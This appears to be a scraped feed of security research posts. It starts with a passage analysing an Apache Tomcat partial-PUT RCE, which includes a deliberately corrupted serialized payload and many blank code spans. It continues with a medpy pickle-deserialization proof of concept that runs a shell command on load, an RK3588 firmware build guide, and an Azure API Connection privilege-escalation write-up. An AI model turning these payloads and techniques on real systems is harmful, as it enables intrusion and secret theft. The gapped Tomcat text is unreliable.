advisory or can't be deduced trivially from the source code. Please read the linked materials and use your favorite search engine on the side! </p><h2>Configuration Requirements</h2><p>I tested the vulnerability on Debian 12. At the time of writing the latest package version for Tomcat 10 is , where the discussed vulnerability is still unfixed.</p><p>The advisory states the following requirements for all exploitation vectors:</p><ul><li><em>\"writes enabled for the default servlet (disabled by default)\"</em></li><li><em>\"support for partial PUT (enabled by default)\"</em></li></ul><p>The first requirement is related to the  property of the <a href=\"https://tomcat.apache.org/tomcat-10.0-doc/default-servlet.html\">Default Servlet</a>. We have to set this property to false in the  configuration of the server:</p><div><pre><code>defaultorg.apache.catalina.servlets.DefaultServletreadonlyfalse</code></pre></div><p>For the RCE the following additional configuration is required:</p><ul><li><em>\"application was using Tomcat's file based session persistence with the default storage location\"</em></li></ul><p>This can be satisfied by adding the following directives to  (I used the global <code>/etc/tomcat10/context.xml</code> file):</p><div><pre><code></code></pre></div><p>The  class in the  tag instructs Tomcat to store sessions in individual files - this is a different solution than the sample configuration provided in  that stores all session data in a single file with a well-defined filename.</p><p>The relevant part of the vulnerable code is this part of the  method:</p><div><pre><code></code></pre></div><p>We can trigger this code path with a request like this:</p><div><pre><code>\n\nx\n</code></pre></div><p>The  header indicates a  PUT, triggering the code path. The temporary file creation logic listed above creates a new file under the \"work\" directory of Tomcat (<code>/var/lib/tomcat10/work/Catalina/&lt;hostname&gt;/&lt;app&gt;/</code> on Debian, I could never wrap my head around Tomcats terminology with CATALINA_BASE&amp;co...). Coincidentally, this same directory is used by  to save sessions, which are serialized Java objects.</p><p>Unfortunately we can't overwrite these files directly, because the  passed to  always starts with a , so our temporary filename will always start with a . </p><p>I tried to circumvent the problem of the dot (slash) prefix without success:</p><ul><li>Requests to absolute paths not beginning with  are rejected</li><li>Full URL's in the first request line are normalized to absolute paths (that start with a )</li><li>Unencoded forward slashes are normalized, requests with backslashes are denied</li><li>Tomcat handles  specially, but I could only use this to make the server ignore parts of the path (but not the first slash) </li><li>Tomcat denies requests containing URL-encoded forward or backward slashes. There is a setting to disable this behavior, but in that case the paths will just contain percent-encoded values</li><li>My UTF-8/Unicode fu wasn't enough either</li></ul><p>The good news is that if we place a file with a  extension in the work directory, it gets periodically parsed by Tomcat... This behavior of file based persistence is a really nice primitive! </p><p>Note that this exploitation path doesn't rely on <a href=\"https://www.openwall.com/lists/oss-security/2025/03/10/5\">\"Path Equivalence\"</a>: the filename is basically directly controlled, and the imposed restrictions (no slashes) let filenames relevant to  slip right through. Path equivalence seems more relevant in the information disclosure/corruption scenario.</p><p>The following are the stated prerequisites for this part:</p><ol><li>writes enabled for the default servlet (disabled by default)</li><li>support for partial PUT (enabled by default)</li><li>a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads</li><li>attacker knowledge of the names of security sensitive files being uploaded</li><li>the security sensitive files also being uploaded via partial PUT</li></ol><p>Aside the aforementioned \"work\" directory, another relevant location here is the \"resource\" directory, mostly used for storing static resources like HTML pages required for the application. On my Debian these application directories are located under <code>/var/lib/tomcat10/webapps</code>.</p><p>Here's how the prerequisites make sense:</p><ul><li> +  are required to reach vulnerable code.</li><li> +  -&gt; A legitimate PUT request to http://example.com/top/secret.txt creates <code>&lt;Resource dir&gt;/top/secret.txt</code> from <code>&lt;Work dir&gt;/.top.secret.txt</code>. The latter temporary file <a href=\"https://github.com/apache/tomcat/blob/dfdb566007aa32cb97dd806785094036a5940ea5/java/org/apache/catalina/servlets/DefaultServlet.java#L666\">remains on the file-system</a> until Tomcat exits.</li><li>Because of  attacker can (re)create <code>&lt;Work dir&gt;/.top.secret.txt</code> by accessing http://example.com:8080/top.secret.txt. The file contents will be based on the leftover temp file created during the upload of the \"secret\" text. This is obviously a problem assuming access to http://example.com:8080/top/ is somehow restricted but http://example.com:8080/top.secret.txt is not.</li></ul><p>On my minimal Debian installation I could only recreate these circumstances by manually giving access to the \"resource\" directory for the  user - I assume such privileges are quite common in real-world scenarios.</p><div><pre><code>\n\n&lt;@d_base64&gt;r_O_0_A_B_X_N_y_A_B_F_q_Y_X_Z_h_L_n_V_0_a_W_w_u_S_G_F_z_a_E_1_h_c_A_U_H_2_s_H_D_F_m_D_R_A_w_A_C_R_g_A_K_b_G_9_h_Z_E_Z_h_Y_3_R_v_c_k_k_A_C_X_R_o_c_m_V_z_a_G_9_s_Z_H_h_w_P_0_A_A_A_A_A_A_A_A_x_3_C_A_A_A_A_B_A_A_A_A_A_B_c_3_I_A_D_G_p_h_d_m_E_u_b_m_V_0_L_l_V_S_T_J_Y_l_N_z_Y_a_/_O_R_y_A_w_A_H_S_Q_A_I_a_G_F_z_a_E_N_v_Z_G_V_J_A_A_R_w_b_3_J_0_T_A_A_J_Y_X_V_0_a_G_9_y_a_X_R_5_d_A_A_S_T_G_p_h_d_m_E_v_b_G_F_u_Z_y_9_T_d_H_J_p_b_m_c_7_T_A_A_E_Z_m_l_s_Z_X_E_A_f_g_A_D_T_A_A_E_a_G_9_z_d_H_E_A_f_g_A_D_T_A_A_I_c_H_J_v_d_G_9_j_b_2_x_x_A_H_4_A_A_0_w_A_A_3_J_l_Z_n_E_A_f_g_A_D_e_H_D_/_/_/_/_/_/_/_/_/_/_3_Q_A_C_3_B_v_c_m_5_o_d_W_I_u_Y_2_9_t_d_A_A_A_c_Q_B_+_A_A_V_0_A_A_R_o_d_H_R_w_c_H_h_0_A_B_J_o_d_H_R_w_O_i_8_v_c_G_9_y_b_m_h_1_Y_i_5_j_b_2_1_4_&lt;/@d_base64&gt;\n</code></pre></div><p>(I corrupted the payload slightly so my site won't be flagged by \"security\" vendors)</p><p>Before this analysis was done I was quick to predict that (based on the advisory) this one will end up in <a href=\"https://www.cisa.gov/known-exploited-vulnerabilities-catalog\">KEV</a>. Now as I see things more clearly disabling  or using  should be relatively rare, having both configured especially so, dropping my chances of being right significantly. </p><p>Nonetheless, Tomcat is everywhere and if the stars align this is a powerful exploit, so I'm still willing to bet a couple of beers on this!</p>","contentLength":6117,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1j9f0ur/analysis_of_cve202524813_apache_tomcat_path/"},{"title":"Impossible XXE in PHP","url":"https://swarm.ptsecurity.com/impossible-xxe-in-php/","date":1741766383,"author":"/u/Fugitif","guid":807,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1j9f0i7/impossible_xxe_in_php/"},{"title":"Detecting and Mitigating the Apache Camel Vulnerability CVE-2025-27636","url":"https://www.akamai.com/blog/security-research/march-apache-camel-vulnerability-detections-and-mitigations","date":1741721021,"author":"/u/oridavid1231","guid":804,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1j8z5i3/detecting_and_mitigating_the_apache_camel/"},{"title":"Npm Run Hack:Me - A Supply Chain Attack Journey","url":"https://rxj.dev/posts/npm-run-hack-supply-chain-attack-journey/","date":1741709539,"author":"/u/unknownhad","guid":797,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1j8ugic/npm_run_hackme_a_supply_chain_attack_journey/"},{"title":"Old medpy Deserialization Vulnerability","url":"https://www.partywave.site/show/research/Old_medpy_Vulnerability","date":1741702990,"author":"/u/AlbatrossMaximum4489","guid":795,"unread":true,"content":"<div><p><b>They certainly give very strange names to diseases.</b></p></div><a href=\"https://github.com/loli/medpy\">- https://github.com/loli/medpy</a><a href=\"https://github.com/loli/medpy/issues/137\">- https://github.com/loli/medpy/issues/137</a><img src=\"https://www.partywave.site/static/images/research-images/Old_medpy_Vulnerability/medpy-git.png\" loading=\"lazy\" alt=\"paragraph image 8 : Old medpy Vulnerability\"><pre><code>$ python3.11 -m virtualenv --python=python2.7 something\n$ source something/bin/activate\n$ pip2 install MedPy==0.3.0 --force\n$ pip2 install itk\n\n'''\nReplace something with you folder name, its just an example\n'''</code></pre><pre><code>82  def main():\n83      args = getArguments(getParser())\n84\n85      # prepare logger\n86      logger = Logger.getInstance()\n87      if args.debug: logger.setLevel(logging.DEBUG)\n88      elif args.verbose: logger.setLevel(logging.INFO)\n89\n90      # loading input images (as image, header pairs)\n91      images = []\n92      headers = []\n93      for image_name in args.images:\n94          i, h = load(image_name)\n95          images.append(i)\n96          headers.append(h)\n\n98      # loading binary foreground masks if supplied, else create masks from threshold value\n99      if args.masks:\n100          masks = [load(mask_name)[0].astype(numpy.bool) for mask_name in args.masks]\n101      else:\n102          masks = [i &gt; args.threshold for i in images]\n103\n104      # if in application mode, load the supplied model and apply it to the images\n105      if args.lmodel:\n106          logger.info('Loading the model and transforming images...')\n107          with open(args.lmodel, 'r') as f:\n108              trained_model = pickle.load(f) &lt;--------- THIS OUR VULNERABLE LINE</code></pre><pre><code>36 from medpy.io import load, save</code></pre><pre><code>174      apply_group.add_argument('--load-model', dest='lmodel', default=False, help='Location of the pickled intensity range model to load. Activated application mode.')\n175\n176      train_group = parser.add_argument_group('train a new model and save and/or apply it')\n177      train_group.add_argument('--save-model', dest='smodel', default=False, help='Save the trained model under this name as a pickled object (should end in .pkl). Activates training mode.')\n\n.....\nif __name__ == \"__main__\":\n    main()</code></pre><pre><code>usage: medpy_intensity_range_standardization.py [-h] [--load-model LMODEL]\n                                                [--save-model SMODEL]\n                                                [--cutoffp CUTOFFP]\n                                                [--landmarkp LANDMARKP]\n                                                [--stdspace STDSPACE]\n                                                [--save-images SIMAGES]\n                                                [--threshold THRESHOLD]\n                                                [--masks MASKS [MASKS ...]]\n                                                [--ignore] [-v] [-d] [-f]\n                                                images [images ...] &lt;---------- THIS IS THE IMAGE PART</code></pre><a href=\"https://www.partywave.site/show/research/Back_to_back_python_pickle\">- https://www.partywave.site/show/research/Back_to_back_python_pickle</a><pre><code>import pickle\nimport os\nimport numpy\n\n\n# code from the original class\nclass IntensityRangeStandardization(object):\n......\n......\n......\n    @staticmethod\n    def linear_model(x, y):\n        \"\"\"\n        Returns a linear model transformation function fitted on the two supplied points.\n        y = m*x + b\n        Note: Assumes that slope &gt; 0, otherwise division through zero might occur.\n        \"\"\"\n        x1, x2 = x\n        y1, y2 = y\n        m = (y2 - y1) / (x2 - x1)\n        b = y1 - (m * x1)\n        return lambda x: m * x + b\n\n    def __reduce__(self):\n        \"\"\"\n        Custom reduce method to execute a system command during deserialization.\n        \"\"\"\n        return (os.system, (\"echo `hostname` &gt; /tmp/dummino\",))\n\nobj = IntensityRangeStandardization()\npickled = pickle.dumps(obj, protocol=0) # Serialize the object with protocol 0 (text mode compatible)\n\nwith open(\"/tmp/modellino.pkl\", \"w\") as f:\n    f.write(pickled)\n\nprint(\"Object serialized and saved to /tmp/modellino.pkl\")</code></pre><pre><code>$ python2.7 exploit.py\nObject serialized and saved to /tmp/modellino.pkl</code></pre><pre><code>ls -la something/bin/medpy_intensity_range_standardization.py\n-rwxrwxr-x 1 kali kali 9676 Jan 17 15:58 something/bin/medpy_intensity_range_standardization.p\n\nmedpy_intensity_range_standardization.py --load-model /tmp/modellino.pkl otsu.png --save-images /tmp</code></pre><img src=\"https://www.partywave.site/static/images/research-images/Old_medpy_Vulnerability/medpy-exploit.png\" loading=\"lazy\" alt=\"paragraph image 29 : Old medpy Vulnerability\">","contentLength":4086,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1j8rx3b/old_medpy_deserialization_vulnerability/"},{"title":"HOWTO: build ATF (Trusted Firmware ARM) and OPTEE for RK3588","url":"https://hardenedvault.net/blog/2025-03-10-build-atf-optee-rk3588/","date":1741629196,"author":"/u/hardenedvault","guid":801,"unread":true,"content":"<h2>HOWTO: build ATF (Trusted Firmware ARM) and OPTEE for RK3588</h2><p>To better implement the protection of digital assets in embedded systems, we have chosen the RK3588 as the prototype platform. Firstly, the RK3588 is backed by an increasingly mature open-source ecosystem. Thanks to the continuous <a href=\"https://www.collabora.com/news-and-blog/blog/2024/02/21/almost-a-fully-open-source-boot-chain-for-rockchips-rk3588/\">efforts of Collabora</a> and the open-source community over the past two years, the RK3588 has achieved a <a href=\"https://www.cnx-software.com/2024/12/21/rockchip-rk3588-mainline-linux-support-current-status-and-future-work-for-2025/\">nearly complete ecosystem with support for key components</a> such as U-Boot, Linux kernel, NPU driver, ATF. In the meanwhile, the maintainer team of <a href=\"https://github.com/dogecoinfoundation\">The Dogecoin Foundation</a> has joined in supporting OP-TEE and completing key features of the hardware-based chain of trust and root of trust, such as OTP (One-Time Programmable) and HUK (Hardware Unique Key). Although open-source does not equal to security, its transparency benefits the security in either security audits and vulnerability hunting, thereby providing a solid foundation for the protection of digital assets.</p><p>Secondly, this SoC not only possesses excellent general computing performance but also must implement security extensions for MMU, similar to TZASC (TrustZone Address Space Controller). Such a design effectively isolates permissions across different software layers, preventing security risks revealed in analyses like <a href=\"https://github.com/hardenedlinux/tzram-audit\">tzram-audit</a>, and ensuring strict isolation between various security zones within the system, thus providing robust hardware-level protection for sensitive assets.</p><p>Thirdly, the RK3588 is equipped with a 6 TOPS NPU (Neural Processing Unit), which offers strong support for edge AI in embedded applications. For private AI application scenarios, such as assisting in crypto trading decisions and building secure, real-time knowledge bases, the high-performance NPU of the RK3588 can achieve efficient data processing and intelligent analysis, thereby promoting the deep application of AI in areas such as secure communication and digital asset management.</p><h2>the boot process of Rockchip</h2><p>The boot code outside of the SOC is mainly divided into two stages, located after 32KiB (64 sectors) and 8MiB (16384 sectors), respectively. The first stage is primarily responsible for memory initialization, while the second stage includes the ARM Trusted Firmware (ATF), TEE, and bootloader. U-Boot can be responsible for generating both of these stages</p><pre tabindex=\"0\"><code>$ make CROSS_COMPILE=aarch64-linux-gnu- PLAT=rk3588 DEBUG=1 SPD=opteed clean\n$ make CROSS_COMPILE=aarch64-linux-gnu- PLAT=rk3588 DEBUG=1 SPD=opteed\n</code></pre><p>Copy or link build/rk3588/debug/bl31/bl31.elf to rk3588/bl31.elf in the u-boot directory.</p><pre tabindex=\"0\"><code>$ make   CROSS_COMPILE64=aarch64-linux-gnu-   PLATFORM=rockchip PLATFORM_FLAVOR=rk3588   CFG_ARM64_core=y   CFG_USER_TA_TARGETS=ta_arm64   CFG_DT=y CFG_CORE_ARM64_PA_BITS=&lt;ram-bits&gt; clean\n$ make   CROSS_COMPILE64=aarch64-linux-gnu-   PLATFORM=rockchip PLATFORM_FLAVOR=rk3588   CFG_ARM64_core=y   CFG_USER_TA_TARGETS=ta_arm64   CFG_DT=y CFG_CORE_ARM64_PA_BITS=&lt;ram-bits&gt;\n</code></pre><p>Where ram-bits is the number of binary bits representing the actual size of memory in bytes.</p><p>Copy or link out/arm-plat-rockchip/core/tee.bin to rk3588/tee.bin in the u-boot directory.</p><p>Download the aforementioned memory initialization blob and copy it to rk3588/ddr.bin in the u-boot directory.</p><pre tabindex=\"0\"><code>$ make ARCH=arm CROSS_COMPILE=aarch64-linux-gnu- rock5a-rk3588s_defconfig\n$ make ARCH=arm CROSS_COMPILE=aarch64-linux-gnu- ROCKCHIP_TPL=rk3588/ddr.bin BL31=rk3588/bl31.elf TEE=rk3588/tee.bin\n$ mkimage -T rksd -n rk3588 -d rk3588/ddr.bin:spl/u-boot-spl.bin idbloader.img\n</code></pre><p>idbloader.img is the first stage, and u-boot.itb is the second stage. Writing both to the specified locations on the SD card will create a usable bootloader:</p><pre tabindex=\"0\"><code># dd if=idbloader.img of=/dev/sdX seek=64\n# dd if=u-boot.itb of=/dev/sdX seek=16384\n</code></pre><pre tabindex=\"0\"><code>U-Boot SPL 2025.04-rc3-00023-g6ae0a578de67 (Mar 03 2025 - 11:46:06 +0800)\nTrying to boot from MMC2\n## Checking hash(es) for config config-1 ... OK\n## Checking hash(es) for Image atf-1 ... sha256+ OK\n....\n....\n....\nNOTICE:  BL31: v2.12.0(debug):v2.12.0-617-ga8a5d39d6\nNOTICE:  BL31: Built : 16:15:14, Mar  6 2025\nINFO:    GICv3 without legacy support detected.\nINFO:    ARM GICv3 driver initialized in EL3\nINFO:    Maximum SPI INTID supported: 511\nINFO:    BL31: Initializing runtime services\nINFO:    BL31: cortex_a55: CPU workaround for erratum 1530923 was applied\nINFO:    BL31: Initializing BL32\nI/TC: \nI/TC: No non-secure external DT\nI/TC: OP-TEE version: 4.5.0-87-g873f5f6c7 (gcc version 14.2.0 (Debian 14.2.0-12)) #1 Tue Feb 25 03:51:56 UTC 2025 aarch64\nI/TC: WARNING: This OP-TEE configuration might be insecure!\nI/TC: WARNING: Please check https://optee.readthedocs.io/en/latest/architecture/porting_guidelines.html\nI/TC: Primary CPU initializing\nI/TC: GIC redistributor base address not provided\nI/TC: Assuming default GIC group status and modifier\nI/TC: Primary CPU switching to normal world boot\nINFO:    BL31: Preparing for EL3 exit to normal world\nINFO:    Entry point address = 0xa00000\nINFO:    SPSR = 0x3c9\nNOT_SUPPORTED: A Firmware Framework implementation does not exist\n\n\nU-Boot 2025.04-rc3-00023-g6ae0a578de67 (Mar 06 2025 - 16:16:43 +0800)\n\nModel: Radxa ROCK 5A\nSoC:   RK3588S\nDRAM:  8 GiB\nNOT_SUPPORTED: A Firmware Framework implementation does not exist\nI/TC: Reserved shared memory is enabled\nI/TC: Dynamic shared memory is disabled\nI/TC: Normal World virtualization support is disabled\nI/TC: Asynchronous notifications are disabled\noptee optee: OP-TEE capabilities mismatch\nCore:  344 devices, 32 uclasses, devicetree: separate\nMMC:   mmc@fe2c0000: 1, mmc@fe2e0000: 0\nLoading Environment from nowhere... OK\nIn:    serial@feb50000\nOut:   serial@feb50000\nErr:   serial@feb50000\nModel: Radxa ROCK 5A\nSoC:   RK3588S\nNet:   eth0: ethernet@fe1c0000\nHit any key to stop autoboot:  2 \b\b\b 1 \b\b\b 0 \nScanning for bootflows in all bootdevs\nSeq  Method       State   Uclass    Part  Name                      Filename\n---  -----------  ------  --------  ----  ------------------------  ----------------\nScanning global bootmeth 'efi_mgr':\nCard did not respond to voltage select! : -110\nCannot persist EFI variables without system partition\n  0  efi_mgr      ready   (none)       0  &lt;NULL&gt;                    \n** Booting bootflow '&lt;NULL&gt;' with efi_mgr\nLoading Boot0000 'mmc 1' failed\nEFI boot manager: Cannot load any image\nBoot failed (err=-14)\nScanning bootdev '<a href=\"https://hardenedvault.net/cdn-cgi/l/email-protection\" data-cfemail=\"076a6a644761623564373737372965686873636271\">[email&nbsp;protected]</a>':\n  1  extlinux     ready   mmc          3  <a href=\"https://hardenedvault.net/cdn-cgi/l/email-protection\" data-cfemail=\"b7dadad4f7d1d285d48787878799d5d8d8c3d3d2c199c7d6c5c3\">[email&nbsp;protected]</a> /boot/extlinux/extlinux.conf\n** Booting bootflow '<a href=\"https://hardenedvault.net/cdn-cgi/l/email-protection\" data-cfemail=\"d8b5b5bb98bebdeabbe8e8e8e8f6bab7b7acbcbdaef6a8b9aaac\">[email&nbsp;protected]</a>_3' with extlinux\nU-Boot menu\n1:\tDebian GNU/Linux 12 (bookworm) 6.1.43-20-rk2312\n2:\tDebian GNU/Linux 12 (bookworm) 6.1.43-20-rk2312 (rescue target)\nEnter choice: 1:\tDebian GNU/Linux 12 (bookworm) 6.1.43-20-rk2312\nRetrieving file: /boot/vmlinuz-6.1.43-20-rk2312\nRetrieving file: /boot/initrd.img-6.1.43-20-rk2312\nappend: root=UUID=3f7cc3b2-4026-493b-bc46-ee2668d25bcc console=ttyFIQ0,1500000n8 iomem=relaxed quiet splash loglevel=4 rw earlycon consoleblank=0 console=tty1 coherent_pool=2M irqchip.gicv3_pseudo_nmi=0 cgroup_enable=cpuset cgroup_memory=1 cgroup_enable=memory swapaccount=1\nRetrieving file: /usr/lib/linux-image-6.1.43-20-rk2312/rockchip/rk3588s-rock-5a.dtb\n## Flattened Device Tree blob at 12000000\n   Booting using the fdt blob at 0x12000000\nWorking FDT set to 12000000\n   Loading Ramdisk to ebeef000, end eceaeda5 ... OK\n   Loading Device Tree to 00000000ebeb2000, end 00000000ebeee8a8 ... OK\nWorking FDT set to ebeb2000\n\nStarting kernel ...\n\nI/TC: Secondary CPU 1 initializing\nI/TC: Secondary CPU 1 switching to normal world boot\nI/TC: Secondary CPU 2 initializing\nI/TC: Secondary CPU 2 switching to normal world boot\nI/TC: Secondary CPU 3 initializing\nI/TC: Secondary CPU 3 switching to normal world boot\nI/TC: Secondary CPU 4 initializing\n...\n...\n...\n[   19.295224] rk-pcie fe190000.pcie: PCIe Link Fail, LTSSM is 0x3, hw_retries=1\n[   20.330335] rk-pcie fe190000.pcie: failed to initialize host\n\nDebian GNU/Linux 12 rock-5a ttyFIQ0\n\nrock-5a login: \n</code></pre><pre tabindex=\"0\"><code>diff --git a/core/arch/arm/kernel/boot.c b/core/arch/arm/kernel/boot.c\n--- a/core/arch/arm/kernel/boot.c\n+++ b/core/arch/arm/kernel/boot.c\n@@ -1121,6 +1121,12 @@ static void init_secondary_helper(void)\n \tinit_vfp_nsec();\n \n \tIMSG(\"Secondary CPU %zu switching to normal world boot\", get_core_pos());\n+\n+\t{\n+\t\tconst paddr_t pa = CFG_TZDRAM_START;\n+\t\tvoid *va = phys_to_virt (pa, MEM_AREA_TEE_RAM, 0x100);\n+\t\tIMSG(\"VAULT: pa: 0x%08x val: 0x%08x,\", (unsigned int)pa, *(unsigned int*)va );\n+\t}\n }\n \n /*\n</code></pre><pre tabindex=\"0\"><code>I/TC: Secondary CPU 7 initializing\nI/TC: Secondary CPU 7 switching to normal world boot\nI/TC: VAULT: pa: 0x08400000 val: 0xaa0003f3,\n</code></pre><pre tabindex=\"0\"><code>[   54.127820] Internal error: synchronous external abort: 0000000096000010 [#1] SMP\n[   54.128488] Modules linked in: tzram_test(O+) zram zsmalloc vfat binfmt_misc fat snd_soc_es8316 pwm_fan cpufreq_dt rockchip_cpufreq ledtrig_netdev ledtrig_timer ledtrig_pattern ledtrig_heartbeat ledtrig_default_on fuse dm_mod ip_tables sdhci_of_dwcmshc dw_hdmi_qp_cec d\n[   54.131014] CPU: 1 PID: 1330 Comm: insmod Tainted: G           O       6.1.43-20-rk2312 #3e26818dc\n[   54.131804] Hardware name: Radxa ROCK 5A (DT)\n[   54.132190] pstate: 40400009 (nZcv daif +PAN -UAO -TCO -DIT -SSBS BTYPE=--)\n[   54.132806] pc : tzram_test_init+0x2c/0x1000 [tzram_test]\n[   54.133298] lr : do_one_initcall+0x84/0x1c4\n[   54.133678] sp : ffff80000cf3bae0\n[   54.133977] x29: ffff80000cf3bae0 x28: ffff800009eaa390 x27: 0000000000000000\n[   54.134609] x26: ffff80000cf3bca0 x25: 0000000000000000 x24: 0000000000000000\n[   54.135241] x23: 0000000000000000 x22: 0000000000000000 x21: ffff80000107c058\n[   54.135872] x20: ffff800009eaa2b8 x19: ffff80000104c000 x18: 0000000000000000\n[   54.136504] x17: 726464615f747269 x16: 76202c7838302578 x15: 0000aaaac5d10f70\n[   54.137135] x14: 5f736968745f5f00 x13: 0064692d646c6975 x12: 622e756e672e6574\n[   54.137767] x11: 0000000000000000 x10: 0000000000000000 x9 : ffff800008014bec\n[   54.138398] x8 : 0101010101010101 x7 : 7f7f7f7f7f7f7f7f x6 : 00000000000024a8\n[   54.139029] x5 : 00000000ffffffff x4 : 0000000000000cc0 x3 : 0000000000000000\n[   54.139661] x2 : ffff000008400000 x1 : 0000000008400000 x0 : ffff80000107b054\n[   54.140292] Call trace:\n[   54.140516]  tzram_test_init+0x2c/0x1000 [tzram_test]\n[   54.140973]  do_one_initcall+0x84/0x1c4\n[   54.141318]  do_init_module+0x54/0x1d8\n[   54.141654]  load_module+0x1848/0x1918\n[   54.141988]  __do_sys_finit_module+0x100/0x11c\n[   54.142388]  __arm64_sys_finit_module+0x20/0x28\n[   54.142797]  invoke_syscall+0x80/0x114\n[   54.143131]  el0_svc_common.constprop.0+0xd0/0x120\n[   54.143562]  do_el0_svc+0x98/0xbc\n[   54.143863]  el0_svc+0x24/0x48\n[   54.144144]  el0t_64_sync_handler+0x90/0xf8\n[   54.144520]  el0t_64_sync+0x174/0x178\n</code></pre><ul><li>Data encryption based on HUK and user-defined seeds</li><li>Compartmentation for bootflow (<a href=\"https://github.com/hardenedvault/vaultboot\">VaultBoot</a>) and runtime TAs</li><li>Further assessment, trade-off of anti-rollback, RPMB, use-case, etc.</li></ul>","contentLength":10834,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1j84rrm/howto_build_atf_trusted_firmware_arm_and_optee/"},{"title":"Azure’s Weakest Link? How API Connections Spill Secrets","url":"https://binsec.no/posts/2025/03/api-connections","date":1741613702,"author":"/u/piraterapper","guid":808,"unread":true,"content":"<p>Binary Security found the undocumented APIs for Azure API Connections. In this post we examine the inner workings of the Connections allowing us to escalate privileges and read secrets in backend resources for services ranging from Key Vaults, Storage Blobs, Defender ATP, to Enterprise Jira and SalesForce servers.\n</p><p>During a client engagement, I was checking out their Azure Resources looking for common vulnerabilities. They were utilizing a Logic App to post some messages to Slack. Usually, we can find some tokens or other sensitive information in the workflow run history of these apps, as it is common to not mark input (and output) as sensitive. I could not find anything of the sort in this case, so I moved on from the investigation. However, by chance I saw an odd response from a request automatically made from the portal when going into the API Connection resource. It was something like:</p><div><div><pre><code>\n\n\nHTTP/2 200 OK\nContent-Length: 1893\nContent-Type: application/json; charset=utf-8\n\n\n{\n    \"kind\": \"V2\",\n    \"properties\": {\n        \"displayName\": \"Slack\",\n        \"authenticatedUser\": {},\n        \"overallStatus\": \"Connected\",\n        \"statuses\":[\n            {\n                \"status\":\"Connected\"\n            }\n        ],\n        \"connectionState\": \"Enabled\",\n        \"parameterValueSet\":{\n            \"name\":\"oauth\",\n            \"values\":{}\n        },\n        \"customParameterValues\": {},\n        \"createdTime\": \"2025-01-24T11:46:25.0499291Z\",\n        \"changedTime\": \"2025-01-24T11:46:25.0499291Z\",\n        \"api\": {\n            \"name\": \"slack\",\n            \"displayName\": \"Slack\",\n            \"description\": \"Slack is a team communication tool, that brings together all of your team communications in one place, instantly searchable and available wherever you go.\",\n            \"iconUri\": \"https://conn-afd-prod-endpoint-bmc9bqahasf3grgk.b01.azurefd.net/u/v-anadhar/UpdateSlackForPlugin/1.0.1715.3917/slack/icon.png\",\n            \"brandColor\": \"#78D4B6\",\n            \"category\": \"Standard\",\n            \"id\": \"/subscriptions/8e3ce52f-d45b-4347-8705-65892507465e/providers/Microsoft.Web/locations/norwayeast/managedApis/slack\",\n            \"type\": \"Microsoft.Web/locations/managedApis\"\n        },\n        \"testLinks\": [\n            {\n                \"requestUri\": \"https://management.azure.com:443/subscriptions/8e3ce52f-d45b-4347-8705-65892507465e/resourceGroups/Logic-app-tests/providers/Microsoft.Web/connections/slack/extensions/proxy/conversations.list?api-version=2018-07-01-preview\",\n                \"method\": \"get\"\n            }\n        ],\n        \"testRequests\": [\n            {\n                \"body\": {\n                    \"request\": {\n                        \"method\": \"get\",\n                        \"path\": \"conversations.list\"\n                    }\n                },\n                \"requestUri\": \"https://management.azure.com:443/subscriptions/8e3ce52f-d45b-4347-8705-65892507465e/resourceGroups/Logic-app-tests/providers/Microsoft.Web/connections/slack/dynamicInvoke?api-version=2018-07-01-preview\",\n                \"method\": \"POST\"\n            }\n        ],\n        \"connectionRuntimeUrl\": \"https://d84b73b612cf5960.16.common.logic-norwayeast.azure-apihub.net/apim/slack/4355f64966c34c0cbfc15d48ec41e0c3\"\n    },\n    \"id\": \"/subscriptions/8e3ce52f-d45b-4347-8705-65892507465e/resourceGroups/Logic-app-tests/providers/Microsoft.Web/connections/slack\",\n    \"name\": \"slack\",\n    \"type\": \"Microsoft.Web/connections\",\n    \"location\": \"norwayeast\"\n}\n\n</code></pre></div></div><p>Now, this might seem uninteresting at first glance, but there are two key fields in this response that really opened up a whole slew of possibilities.</p><h2>The Inherent Insecurity of API Connections</h2><p>Consider the  and  fields of the above response. It seems that they provide a sort of proxy between the Azure Management API and the actual backend server, most clearly seen by the  path. We can also see that the connection perhaps is authenticated in some way, by the  value in the . Now, naively, I would think that this means that some user, probably whoever set this up, is authenticated to this connection, and we would need his token to call through the connection, or maybe do an  dance ourselves.</p><p>What I would  expect is that anyone with Reader permissions on the connection is allowed to arbitrarily call any endpoint on the connection:</p><div><div><pre><code>\n\n\nHTTP/2 200 OK\nContent-Type: application/json\nContent-Length: 18329\n\n\"ok\": true,\n\"channels\": [\n    {\n        \"id\": \"C08B8RB5D39\",\n        \"name\": \"social\",\n        \"is_channel\": true,\n        \"is_group\": false,\n        \"is_im\": false,\n        \"is_mpim\": false,\n        \"is_private\": false,\n        \"created\": 1738674777,\n        \"is_archived\": false,\n        \"is_general\": false,\n        \"unlinked\": 0,\n        \"name_normalized\": \"social\",\n        \"is_shared\": false,\n        \"is_org_shared\": false,\n        \"is_pending_ext_shared\": false,\n        \"pending_shared\": [],\n        \"context_team_id\": \"T08BPBEC890\",\n        \"updated\": 1738674779593,\n        \"parent_conversation\": null,\n        \"creator\": \"U08C22K3HPT\",\n        \"is_ext_shared\": false,\n        \"shared_team_ids\": [\n            \"T08BPBEC890\"\n        ],\n        \"pending_connected_team_ids\": [],\n        \"is_member\": true,\n&lt;...&gt;\n\n</code></pre></div></div><p>The response is actually exactly the same as a direct query on the Slack API endpoint <a href=\"https://api.slack.com/methods/conversations.list\">conversations.list</a></p><p>While the Slack case is perhaps not the most security critical, this result begs the question: Does this work for all the other types of APIs exposed through this interface?</p><p>The answer is yes. If you have created an API Connection to any backend server, this includes other Azure resources, all Readers on that subscription can call all  requests defined on the connection. Specifically, this includes Key Vaults, SQL Databases, Jira-servers, Defender ATP, etc.</p><h2>Azure Management (ARM) API’s Security Model</h2><p>Before I show how to exploit this properly, 